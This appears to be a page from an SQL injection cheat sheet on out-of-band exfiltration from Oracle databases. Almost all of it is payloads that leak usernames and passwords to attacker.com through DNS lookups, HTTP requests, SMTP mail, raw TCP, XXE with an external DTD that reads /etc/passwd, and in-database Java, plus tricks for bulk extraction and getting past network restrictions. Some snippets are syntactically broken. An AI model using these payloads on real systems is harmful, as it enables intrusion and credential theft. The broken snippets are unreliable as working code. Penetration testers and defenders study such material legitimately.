---
title: Out Of Band Channeling
description: Techniques for extracting Oracle data via out-of-band channels
category: Advanced Techniques
order: 13
tags: ["oob", "exfiltration", "data extraction", "alternative channels"]
lastUpdated: 2025-03-15
---

## Out Of Band Channeling

Out-of-Band (OOB) techniques provide a powerful method for data extraction when traditional SQL injection methods are limited. These techniques use alternative channels, such as DNS, HTTP, or email, to exfiltrate data from the database without relying on the application's direct response.

### Oracle OOB Mechanisms

Oracle provides several packages that can be used for OOB data exfiltration:

| Package       | Function           | Description          | Protocol | Privileges Required   |
| ------------- | ------------------ | -------------------- | -------- | --------------------- |
| `UTL_HTTP`    | `REQUEST`          | Makes HTTP requests  | HTTP(S)  | EXECUTE on UTL_HTTP   |
| `UTL_TCP`     | `OPEN_CONNECTION`  | Opens TCP connection | TCP      | EXECUTE on UTL_TCP    |
| `UTL_SMTP`    | `SEND_MAIL`        | Sends email          | SMTP     | EXECUTE on UTL_SMTP   |
| `UTL_INADDR`  | `GET_HOST_ADDRESS` | Resolves DNS         | DNS      | EXECUTE on UTL_INADDR |
| `DBMS_LDAP`   | `INIT`             | Connects to LDAP     | LDAP     | EXECUTE on DBMS_LDAP  |
| `HTTPURITYPE` | `GETCLOB`          | Fetches HTTP content | HTTP(S)  | Basic privileges      |

### DNS-Based Data Exfiltration

DNS-based techniques are often the most reliable as they can bypass many security restrictions:

```sql
-- Basic DNS exfiltration using UTL_INADDR
' AND UTL_INADDR.GET_HOST_ADDRESS('data.'||(SELECT username FROM users WHERE rownum=1)||'.attacker.com')--

-- Concatenating multiple values
' AND UTL_INADDR.GET_HOST_ADDRESS('data.'||(SELECT username||'.'||password FROM users WHERE rownum=1)||'.attacker.com')--
```

### HTTP-Based Data Exfiltration

HTTP requests can send data directly to an attacker-controlled server:

```sql
-- Basic HTTP exfiltration using UTL_HTTP
' AND UTL_HTTP.REQUEST('http://attacker.com/data?d='||(SELECT username FROM users WHERE rownum=1))--

-- With Base64 encoding
' AND UTL_HTTP.REQUEST('http://attacker.com/data?d='||UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW((SELECT username FROM users WHERE rownum=1)))))--
```

### SQL Injection Examples

#### DNS Exfiltration

```sql
-- Extracting usernames via DNS
' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT username FROM users WHERE rownum=1)||'.attacker.com/"> %remote;]>'),'/l') FROM dual--

-- Extracting password hashes via DNS
' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE rownum=1)||'.attacker.com/"> %remote;]>'),'/l') FROM dual--
```

#### HTTP Exfiltration

```sql
-- Using HTTPURITYPE
' UNION SELECT HTTPURITYPE('http://attacker.com/data?user='||(SELECT username FROM users WHERE rownum=1)).GETCLOB() FROM dual--

-- Using UTL_HTTP with POST
' BEGIN
    UTL_HTTP.SET_HEADER(req => UTL_HTTP.BEGIN_REQUEST('http://attacker.com/collect', 'POST'),
                        name => 'Content-Type',
                        value => 'application/x-www-form-urlencoded');
    UTL_HTTP.SET_HEADER(req => r, name => 'Content-Length',
                        value => LENGTH('data='||(SELECT username||':'||password FROM users WHERE rownum=1)));
    UTL_HTTP.WRITE_TEXT(r, 'data='||(SELECT username||':'||password FROM users WHERE rownum=1));
    COMMIT;
  END;--
```

### Email Exfiltration

Using UTL_SMTP to send data via email:

```sql
-- Basic email exfiltration
' BEGIN
    DECLARE
      c UTL_SMTP.CONNECTION;
    BEGIN
      c := UTL_SMTP.OPEN_CONNECTION('mail.attacker.com', 25);
      UTL_SMTP.HELO(c, 'victim.com');
      UTL_SMTP.MAIL(c, 'oracle@victim.com');
      UTL_SMTP.RCPT(c, 'collector@attacker.com');
      UTL_SMTP.DATA(c, 'From: oracle@victim.com' || CHR(13) || CHR(10) ||
                       'To: collector@attacker.com' || CHR(13) || CHR(10) ||
                       'Subject: Oracle Data' || CHR(13) || CHR(10) || CHR(13) || CHR(10) ||
                       'Data: ' || (SELECT username||':'||password FROM users WHERE rownum=1) || CHR(13) || CHR(10) || CHR(13) || CHR(10) || '.');
      UTL_SMTP.QUIT(c);
    END;
  END;--
```

### TCP Socket Exfiltration

Using UTL_TCP to send data over raw TCP:

```sql
-- Basic TCP exfiltration
' BEGIN
    DECLARE
      c UTL_TCP.CONNECTION;
      data VARCHAR2(4000);
    BEGIN
      data := (SELECT username||':'||password FROM users WHERE rownum=1);
      c := UTL_TCP.OPEN_CONNECTION('attacker.com', 4444);
      UTL_TCP.WRITE_LINE(c, data);
      UTL_TCP.CLOSE_CONNECTION(c);
    END;
  END;--
```

### Advanced Techniques

#### XML External Entity (XXE) Exfiltration

Using XXE to exfiltrate data:

```sql
-- XXE attack with Oracle's XML capabilities
' SELECT XMLTYPE('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root>&exfil;</root>') FROM dual--
```

Where evil.dtd on attacker.com contains:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://attacker.com/collect?data=%data;'>">
%payload;
```

#### Using Java in the Database

If Java is enabled:

```sql
-- Using Java to send HTTP request
' BEGIN
    EXECUTE IMMEDIATE 'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "HttpSender" AS
      import java.net.*;
      import java.io.*;
      public class HttpSender {
        public static void sendData(String url) throws Exception {
          URL u = new URL(url);
          HttpURLConnection conn = (HttpURLConnection) u.openConnection();
          conn.getResponseCode();
        }
      }';
    EXECUTE IMMEDIATE 'CREATE OR REPLACE FUNCTION http_send(url IN VARCHAR2) RETURN VARCHAR2 AS
      LANGUAGE JAVA NAME ''HttpSender.sendData(java.lang.String) return java.lang.String'';';
    EXECUTE http_send('http://attacker.com/collect?data=' ||
                     (SELECT username||':'||password FROM users WHERE rownum=1));
  END;--
```

### Extracting Large Volumes of Data

For extracting large datasets:

```sql
-- Using LISTAGG to consolidate data
' BEGIN
    UTL_HTTP.REQUEST('http://attacker.com/data?users=' ||
                     (SELECT LISTAGG(username||':'||password, ',') WITHIN GROUP (ORDER BY username)
                      FROM users WHERE rownum <= 10));
  END;--

-- Using cursor-based extraction
' BEGIN
    DECLARE
      CURSOR c IS SELECT username, password FROM users;
      v_data VARCHAR2(4000);
    BEGIN
      FOR r IN c LOOP
        v_data := 'user=' || r.username || '&pass=' || r.password;
        UTL_HTTP.REQUEST('http://attacker.com/collect?' || v_data);
      END LOOP;
    END;
  END;--
```

### Bypassing Restrictions

#### Overcoming Network Restrictions

```sql
-- Testing for outbound connectivity
' UNION SELECT CASE WHEN (UTL_INADDR.GET_HOST_ADDRESS('attacker.com') IS NOT NULL) THEN 'OUTBOUND ALLOWED' ELSE 'BLOCKED' END, NULL FROM dual--

-- Using alternative ports
' AND UTL_HTTP.REQUEST('http://attacker.com:8080/data?d='||(SELECT username FROM users WHERE rownum=1))--
```

#### Handling Data Encoding Issues

```sql
-- URL encoding sensitive data
' AND UTL_HTTP.REQUEST('http://attacker.com/data?d='||
                      UTL_URL.ESCAPE((SELECT username FROM users WHERE rownum=1), TRUE))--

-- Hexadecimal encoding
' AND UTL_INADDR.GET_HOST_ADDRESS(SUBSTR(RAWTOHEX((SELECT username FROM users WHERE rownum=1)),1,8)||'.attacker.com')--
```
